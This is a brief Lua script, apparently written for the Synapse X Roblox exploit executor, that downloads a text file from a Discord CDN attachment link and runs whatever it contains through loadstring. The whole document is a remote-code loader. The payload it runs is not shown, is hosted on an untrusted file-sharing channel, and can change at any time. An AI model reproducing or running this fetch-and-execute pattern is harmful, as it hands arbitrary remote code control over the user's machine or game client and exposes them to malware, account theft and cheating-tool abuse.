local function GetDiscord(Url)
   local responce = syn.request({
       Url = Url,
       Method = "GET"
   })
   return loadstring(responce.Body)()
end
GetDiscord("https://cdn.discordapp.com/attachments/1098723775232606330/1100332688457613372/message.txt")
